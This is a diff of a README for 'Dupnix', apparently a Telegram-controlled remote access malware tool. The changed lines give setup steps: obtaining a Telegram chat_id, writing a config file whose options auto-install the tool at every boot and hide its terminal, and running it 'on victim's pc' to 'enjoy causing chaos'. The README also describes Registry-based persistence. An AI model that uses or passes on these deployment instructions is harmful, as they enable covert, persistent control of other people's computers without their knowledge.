@@ -33,7 +33,7 @@ Dupnix communicates to you through telegram, so nobody can detect who's on the o
 - go to `https://api.telegram.org/bot<api Token>/getUpdates` 
 - Find the `"id":` number, that's ur `chat_id`
 ### Json
-- You need to create a json file, [dupnix-config.json](Dupnix%203/dupnix-config.json) is a template
+- You need to create a json file which name is `dupnix-config.json`, in releases there is a template
     - `autostart <true/false>` automatically installs the Dupnix and runs it every pc boot
     - `hide_terminal <true/false>` who would expect that it hides the terminal?
     - `refresh_rate <seconds>` how often Dupnix checks if you sent some message
@@ -43,7 +43,7 @@ Dupnix communicates to you through telegram, so nobody can detect who's on the o
     - `path` path where u want the Dupnix to be (you can use `%sysdisk%` and `%username%`)
 
 ### Instalation on victim's pc
-- Just run executable (in same directory as json file) and enjoy causing chaos!
+- Just run executable (in the directory where .json file is) and enjoy causing chaos!
 ## Usage
 #### Autostart
 * Dupnix is copied to the path specified in `dupnix-config.json` and is being added to autostart through Registry
